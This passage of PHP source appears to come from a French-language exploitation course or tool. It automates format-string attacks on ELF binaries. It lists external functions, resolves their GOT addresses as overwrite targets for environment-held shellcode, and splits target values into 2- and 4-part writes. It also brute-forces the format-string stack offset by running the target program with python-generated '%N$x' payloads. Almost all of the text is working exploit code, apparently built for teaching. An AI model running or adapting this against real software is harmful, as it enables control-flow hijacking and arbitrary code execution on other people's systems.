	$this->chapitre("SHELLCODE GOT - WHERE:Fournit par .got (Global Offset Table entries)");
	$tmp = $this->elf2fonctions_externes();
	$this->tab($tmp);
	$this->pause();
	foreach($tmp as $val){
		$val = trim($val);
		$this->article("Fonction 2 replace", $val);
		$val = str_replace("@plt", "", $val);
		$where = $this->elf2addr4fonction_got($val);
		$this->ret2fmt_execution_shellcode_env($where, $offset);
		$this->pause();
	}
}





function ret2fmt_env_payload($where, $what, $offset, $option) {
	$this->ret2fmt_payload_4_times_env($where, $what, $offset, $option);
	$this->ret2fmt_payload_2_times_env($where, $what, $offset, $option);
	$this->ret2fmt_payload_1_times_env($where, $what, $offset, $option);
}

function what_2_times($what) {
	$what = $this->hex2norme_32($what);
	$tmp1 = "0x$what[2]$what[3]$what[4]$what[5]";
	$tmp2 = "0x$what[6]$what[7]$what[8]$what[9]";
	return array ($tmp1,$tmp2);
}

function what_4_times($what) {
	$what = $this->hex2norme_32($what);
	$tmp1 = "0x$what[2]$what[3]";
	$tmp2 = "0x$what[4]$what[5]";
	$tmp3 = "0x$what[6]$what[7]";
	$tmp4 = "0x$what[8]$what[9]";
	return array ($tmp1,$tmp2,$tmp3,$tmp4);
}


function ret2fmt_offset($chaine, $grep) {
	$this->ssTitre("Find Offset until argv");
	$find = false;
	for($i = 1; ! $find and $i < 131072; $i ++) {
		$query = "$this->file_path `python -c 'print \"$chaine%$i\$x\"'`  | grep $grep$grep;echo  ";
		echo "$query\n";
		exec($query, $resu);
		$tmp = $resu [0];
		unset($resu);
		if (! empty($tmp)) {
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$x\"'`  |grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$xD\"'`  |grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$xDD\"'`  |grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$xDDD\"'`  |grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$i --;
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$x\"'`  | grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$xD\"'`  | grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$xDD\"'`  | grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
			$query = "$this->file_path `python -c 'print \"$chaine%$i\$xDDD\"'`  | grep $grep$grep$grep$grep;echo";
			exec($query, $resu2);
			if (! empty($resu2 [0])) {
				$find = true;
				$this->requette($query);
				$this->pause();
				return $i;
			}
			unset($resu2);
		}
	}
}



}
// ###############################################################################################
?>
